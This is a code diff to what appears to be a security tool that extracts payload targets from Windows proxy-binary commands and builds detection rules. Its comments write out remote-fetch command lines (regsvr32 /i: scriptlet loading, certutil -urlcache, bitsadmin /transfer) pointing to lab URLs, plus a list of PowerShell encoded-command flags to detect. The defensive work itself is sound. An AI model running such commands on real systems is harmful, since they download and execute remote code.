@@ -656,11 +656,27 @@ def _decode_powershell_encoded_command(command: str) -> Optional[str]:
 def _extract_proxy_target(command: str, interpreter: str) -> Optional[str]:
     """Extract the proxy binary's payload target (URL / DLL / .ocx / .msi).
 
-    For mshta the target is the script URL or HTA path; for rundll32
-    it's ``DLL,Function``; for regsvr32 it's a COM object path / URL;
-    for msiexec it's the .msi path / URL. Best-effort: returns the
-    first non-flag token after the proxy binary, or ``None`` when no
-    such token is present.
+    Per-interpreter logic so the extracted token is the actual
+    payload defenders would alert on, not the first non-flag word:
+
+    - ``mshta`` / ``msiexec`` / ``installutil``: first non-flag token
+      after the binary.
+    - ``rundll32``: ``DLL,Function`` shape - first non-flag token,
+      falling back to the second token if every token after the
+      binary starts with a flag prefix.
+    - ``regsvr32``: prefer a ``/i:`` flag's URL value
+      (``regsvr32 /s /n /u /i:http://lab/x.sct scrobj.dll``); fall
+      back to the first non-flag token.
+    - ``bitsadmin``: look for the first ``http://`` / ``https://``
+      URL anywhere in the command. Without this rule the first
+      non-flag token in a real ``bitsadmin /transfer myJob /download
+      URL PATH`` line would be the job name.
+    - ``certutil``: same URL-first heuristic. ``certutil -urlcache
+      -split -f http://lab/x.txt`` has every flag-looking token
+      leading the URL, which a generic flag-skip rule would consume
+      with nothing left.
+
+    Returns ``None`` when no payload target can be extracted.
     """
 
     if not command.strip():
@@ -671,31 +687,52 @@ def _extract_proxy_target(command: str, interpreter: str) -> Optional[str]:
         tokens = command.strip().split()
     if len(tokens) < 2:
         return None
-    # Skip the leading executable + any flag tokens (start with ``-``
-    # or ``/``). The first remaining token is the payload target.
+
+    def _strip_quotes(token: str) -> str:
+        if (
+            len(token) >= 2
+            and token[0] == token[-1]
+            and token[0] in {'"', "'"}
+        ):
+            return token[1:-1]
+        return token
+
+    # ``regsvr32 /s /n /u /i:URL scrobj.dll`` - the URL is embedded in
+    # the ``/i:`` flag, which a generic "skip slash-prefix" rule would
+    # drop entirely.
+    if interpreter == "regsvr32":
+        for token in tokens[1:]:
+            stripped = _strip_quotes(token)
+            for prefix in ("/i:", "-i:", "/n:", "-n:"):
+                if stripped.lower().startswith(prefix.lower()):
+                    payload = stripped[len(prefix):]
+                    if payload:
+                        return payload
+
+    # ``bitsadmin /transfer <job> /download URL PATH`` - the operator
+    # cares about the URL, not the job name. ``certutil -urlcache
+    # -split -f URL`` has the same pattern.
+    if interpreter in {"bitsadmin", "certutil"}:
+        for token in tokens[1:]:
+            stripped = _strip_quotes(token)
+            lowered = stripped.lower()
+            if lowered.startswith(("http://", "https://", "ftp://")):
+                return stripped
+
+    # General path: skip flag tokens (``-`` / ``/`` prefix), return the
+    # first remaining word.
     for token in tokens[1:]:
         if token.startswith("-") or token.startswith("/"):
             continue
-        candidate = token
-        if (
-            len(candidate) >= 2
-            and candidate[0] == candidate[-1]
-            and candidate[0] in {'"', "'"}
-        ):
-            candidate = candidate[1:-1]
+        candidate = _strip_quotes(token)
         if candidate:
             return candidate
+
     # rundll32 callers commonly pass the DLL,Function pair as a single
-    # token after a flag — fall through to returning the second-to-last
-    # token when nothing un-flagged was found.
+    # token after a flag — fall through to returning the second token
+    # when nothing un-flagged was found.
     if interpreter == "rundll32" and len(tokens) >= 2:
-        candidate = tokens[1]
-        if (
-            len(candidate) >= 2
-            and candidate[0] == candidate[-1]
-            and candidate[0] in {'"', "'"}
-        ):
-            candidate = candidate[1:-1]
+        candidate = _strip_quotes(tokens[1])
         return candidate or None
     return None
 
@@ -853,17 +890,50 @@ class ExecutionModule(BaseModule):
         elif decoded_command is not None:
             title = f"PowerShell EncodedCommand execution ({target_os})"
             logsource = {"category": "process_creation", "product": "windows"}
+            # Cover every flag spelling the decoder accepts: ``-enc``,
+            # ``-ec``, ``-EncodedCommand``, ``-encoded``, ``-encode``,
+            # plus the ``/`` prefix variants. Hardcoding ``-enc`` would
+            # systematically miss commands that used ``/enc`` or the
+            # long form, even though the module successfully decoded
+            # them.
             selection = {
                 "process.image|endswith": "\\powershell.exe",
-                "process.command_line|contains_all": ["-enc"],
+                "process.command_line|contains_any": [
+                    "-EncodedCommand",
+                    "/EncodedCommand",
+                    "-encoded",
+                    "/encoded",
+                    "-encode",
+                    "/encode",
+                    "-enc",
+                    "/enc",
+                    "-ec",
+                    "/ec",
+                ],
             }
         else:
             title = f"Suspicious command execution ({target_os})"
             logsource = _execution_logsource(target_os)
+            # Real EDR / Sysmon EID 1 captures process.image with the
+            # binary's full filename (``...\\powershell.exe``). When the
+            # operator types ``powershell -c X`` (no ``.exe``), the
+            # basename helper returns ``powershell``; the prior draft
+            # would emit ``\\powershell`` which never matches a real
+            # capture. Append ``.exe`` for Windows when the basename
+            # has no extension so the rule actually fires.
+            image_match: str
+            if image_basename:
+                if (
+                    target_os == "windows"
+                    and "." not in image_basename
+                ):
+                    image_match = f"\\{image_basename}.exe"
+                else:
+                    image_match = f"\\{image_basename}"
+            else:
+                image_match = command.split(" ")[0]
             selection = {
-                "process.image|endswith": (
-                    f"\\{image_basename}" if image_basename else command.split(" ")[0]
-                ),
+                "process.image|endswith": image_match,
                 "process.command_line|contains": image_basename or command.split(" ")[0],
             }
 
